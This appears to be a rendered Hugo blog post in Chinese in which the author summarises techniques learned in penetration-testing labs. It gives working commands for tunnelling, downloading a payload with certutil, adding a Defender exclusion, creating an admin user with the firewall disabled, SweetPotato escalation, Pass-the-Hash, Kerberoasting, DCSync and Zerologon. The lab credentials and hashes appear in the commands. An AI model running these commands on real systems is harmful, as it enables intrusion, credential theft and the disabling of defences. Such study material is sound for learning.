@@ -1,0 +1,1094 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 渗透靶场打了十来个了，是时候做一个总结了，总结一下学到的一些渗透知识 入口打点 首先就是fscan等等的扫描器，扫描一下功能点、有无漏洞点 一">
+<title>渗透知识点汇总</title>
+
+<link rel='canonical' href='http://localhost:1313/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="渗透知识点汇总">
+<meta property='og:description' content="前言 渗透靶场打了十来个了，是时候做一个总结了，总结一下学到的一些渗透知识 入口打点 首先就是fscan等等的扫描器，扫描一下功能点、有无漏洞点 一">
+<meta property='og:url' content='http://localhost:1313/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-26T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="渗透知识点汇总">
+<meta name="twitter:description" content="前言 渗透靶场打了十来个了，是时候做一个总结了，总结一下学到的一些渗透知识 入口打点 首先就是fscan等等的扫描器，扫描一下功能点、有无漏洞点 一">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#入口打点">入口打点</a></li>
+    <li><a href="#内网连接">内网连接</a></li>
+    <li><a href="#域控打法">域控打法</a>
+      <ol>
+        <li><a href="#域外">域外</a></li>
+        <li><a href="#域内">域内</a></li>
+      </ol>
+    </li>
+    <li><a href="#一些常见命令">一些常见命令</a>
+      <ol>
+        <li><a href="#windows远程下载">windows远程下载</a></li>
+        <li><a href="#添加杀软白名单">添加杀软白名单</a></li>
+        <li><a href="#检查windows自动登录配置">检查Windows自动登录配置</a></li>
+        <li><a href="#rdp开启">RDP开启</a></li>
+        <li><a href="#免杀检测">免杀检测</a></li>
+        <li><a href="#mimikatz获取凭证">mimikatz获取凭证</a></li>
+      </ol>
+    </li>
+    <li><a href="#前置知识点">前置知识点：</a>
+      <ol>
+        <li><a href="#tgt">TGT</a></li>
+        <li><a href="#kerberos">Kerberos</a></li>
+      </ol>
+    </li>
+    <li><a href="#知识点">知识点</a>
+      <ol>
+        <li><a href="#pth">PTH</a></li>
+        <li><a href="#spn">SPN</a></li>
+        <li><a href="#ips">IPS</a></li>
+        <li><a href="#dcsync">Dcsync</a></li>
+        <li><a href="#zerologon">Zerologon</a></li>
+        <li><a href="#as-rep-roasting">AS-REP-Roasting</a></li>
+        <li><a href="#ad-cs">AD-CS</a></li>
+        <li><a href="#dpapi凭据解密">DPAPI凭据解密</a></li>
+        <li><a href="#约束性委派">约束性委派</a></li>
+        <li><a href="#非约束性委派">非约束性委派</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" >
+                知识点总结
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">渗透知识点汇总</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-01-26</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>渗透靶场打了十来个了，是时候做一个总结了，总结一下学到的一些渗透知识</p>
+<h2 id="入口打点">入口打点
+</h2><p>首先就是<code>fscan</code>等等的扫描器，扫描一下功能点、有无漏洞点</p>
+<p>一般有猫腻的端口就是以下几种</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">80     //http
+</span></span><span class="line"><span class="cl">443    //https
+</span></span><span class="line"><span class="cl">445    //smb     可能弱口令
+</span></span><span class="line"><span class="cl">1433   //sqlserver  
+</span></span><span class="line"><span class="cl">3306   //mysql   数据库可能有弱口令、其中也可能有一些用户密码
+</span></span><span class="line"><span class="cl">3389   //windowsRDP
+</span></span><span class="line"><span class="cl">6379   //redis   这个打的多点，有各种拿shell的方法
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">有些还会自己挑端口开web服务，有时候还要全扫端口
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一些扫描也可扫到一些漏洞点，直接打就可以</p>
+<p>web漏洞点的话就不多说了，一些网站的配置文件里可能会写数据库的密码</p>
+<p>数据库的话一般都是弱口令，连接远程下载木马后门上线，数据库连接后可以看看里面有没有什么用户密码之类的</p>
+<p>RDP也是一些弱口令把，有些有时候可以直接爆破连接上，不过RDP弱口令一般不会出现在入口机</p>
+<h2 id="内网连接">内网连接
+</h2><p>拿下入口的shell之后，就要开始进行内网连接了，这里首推<code>stowaway</code></p>
+<p>不仅可以多级代理，还能正反向连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 8888          //在vps
+</span></span><span class="line"><span class="cl">./linux_x64_agent -c &lt;vps&gt;:8888
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">也可以正向连接
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./linux_x64_agent -l 8888
+</span></span><span class="line"><span class="cl">./linux_x64_admin -c &lt;靶场ip&gt;:8888
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>连接上了之后可以开启socks代理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use 0  //选择节点
+</span></span><span class="line"><span class="cl">socks 9999 //创建socks连接
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>之后通过socks代理连接就可以进入内网了，可以用<code>proxifier</code>这个一般是给蚁剑等等exe利用的，或者用<code>proxychains</code>这个是给一些终端利用的</p>
+<h2 id="域控打法">域控打法
+</h2><h3 id="域外">域外
+</h3><p>域外到域内就是域内用户爆破和一些CVE，比如<code>zerologon</code></p>
+<h3 id="域内">域内
+</h3><p>域内可以打的就多了，可以先在域内机中找找有没有RDP的凭证啥的</p>
+<p>之后可以用<code>ADfind</code>分析一下，可以打的还蛮多</p>
+<h2 id="一些常见命令">一些常见命令
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo root:password|chpasswd
+</span></span><span class="line"><span class="cl">修改root密码，改为password
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="windows远程下载">windows远程下载
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certutil -urlcache -split -f http://172.20.55.32/1.exe 1.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="添加杀软白名单">添加杀软白名单
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">powershell -Command &#34;Add-MpPreference -ExclusionPath &#39;C:\&#39;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="检查windows自动登录配置">检查Windows自动登录配置
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">shell reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="rdp开启">RDP开启
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user liernian qwer123! /add
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">net localgroup Administrators liernian /add
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">netsh advfirewall set allprofiles state off
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /d 0 /f	
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>土豆提权版RDP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SweetPotato.exe -a &#34;REG ADD \&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&#34; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> SweetPotato.exe -a &#34;net user liernian 123Qwe! /add&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SweetPotato.exe -a &#34;net localgroup Administrators liernian /add&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SweetPotato.exe -a &#34;reg add \&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&#34; /v UserAuthentication /t REG_DWORD /d 0 /f&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SweetPotato.exe -a &#34;netsh advfirewall set allprofiles state off&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="免杀检测">免杀检测
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tasklist /svc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="mimikatz获取凭证">mimikatz获取凭证
+</h3><p><img src="C:%5cUsers%5c28105%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20260131153850649.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260131153850649"
+	
+	
+></p>
+<h2 id="前置知识点">前置知识点：
+</h2><h3 id="tgt">TGT
+</h3><h3 id="kerberos">Kerberos
+</h3><h2 id="知识点">知识点
+</h2><h3 id="pth">PTH
+</h3><p>哈希传递攻击（Pass-the-Hash，简称 <strong>PTH</strong>）是内网渗透和横向移动中非常经典且核心的技术。它的核心思想是：攻击者不需要获得明文密码，只需要获得用户的 NTLM Hash，就可以通过该 Hash 冒充用户身份进行身份验证，从而访问网络资源。</p>
+<p>在渗透靶场中，一般都是最后一步，拿下域控管理员的<code>NTLM</code>哈希之后，通过<code>PTH</code>拿下同一域中其他所有的shell</p>
+<p>示例（Impacket包中）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 python3 smbexec.py -hashes :932dce8df403ee184aafc797087e309a cyberstrikelab.com/administrator@10.0.0.5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="spn">SPN
+</h3><p>SPN (Service Principal Name Kerberos ) 是 Kerberos 身份验证系统中用于唯一标识服务实例的标识符。</p>
+<p>在有低权限用户的账号和密码的情况下，可以通过获取SPN，再对SPN进行哈希爆破（hashcat），从而获取能够RDP登录的<code>用户/密码</code></p>
+<p>通过<code>impacket</code>的<code>GetUserSPNs</code>可以获取<code>SPN</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>哈希爆破</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hashcat.exe -m 13100 hash.txt rockyou.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><code>-m 13100</code> (命令 1)</strong></p>
+<ul>
+<li><strong>协议/类型</strong>: <strong>Kerberos 5, TGS-REP etype 23</strong></li>
+<li><strong>攻击名称</strong>: <strong>Kerberoasting</strong></li>
+<li><strong>目标</strong>: 此攻击针对的是<strong>服务账户</strong>（Service Accounts）。</li>
+<li><strong>原理</strong>: 攻击者请求一个服务票据（TGS），AD 会返回一个用该服务账户密码哈希加密的票据。攻击者离线破解这个票据来获取服务账户的明文密码。</li>
+</ul>
+<h3 id="ips">IPS
+</h3><h3 id="dcsync">Dcsync
+</h3><p>DCSync 允许攻击者<strong>模拟</strong>一个域控制器（DC），向真实的域控制器发出数据同步请求，从而获取域内任意用户的凭据（包括 NTLM 哈希、AES 密钥、密码历史记录等），而无需直接登录到域控制器本身。</p>
+<p>在你的靶机是域管理员权限，并且拥有该靶机的本地管理员权限时，可以通过<code>Dcsybc</code>获取域内 <code>Administrator</code> 的哈希</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lsadump::dcsync /domain:xiaorang.lab /all /csv
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有了域内域内 <code>Administrator</code> 的哈希，就可以通过<code>PTH</code>登录域内任意主机</p>
+<h3 id="zerologon">Zerologon
+</h3><p>CVE-2020-1472，是一个最高危的漏洞，漏洞效果如下：未经身份验证的攻击者可以将域控制器机器账户（例如 <code>DC01$</code>）的密码重置为空</p>
+<p>置空之后就可以导出域内 <code>Administrator</code> 的哈希，也就可以打PTH了</p>
+<p>具体操作如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*检测是否存在*（需要域名或者ip和域控主机名）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lsadump::zerologon /target:10.0.0.60 /account:DC$
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*进行置空*
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lsadump::zerologon /target:10.0.0.60  /ntlm /null /account:DC$ /exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">之后可以通过dcsync获取哈希（不建议）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lsadump::dcsync /csv /domain:cyberstrikelab.com /dc:WIN-7NRTJO59O7N.cyberstrikelab.com /user:administrator /authuser:WIN-7NRTJO59O7N$ /authpassword:&#34;&#34; /authntlm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">也可以用impacket包中的secretsdump导出
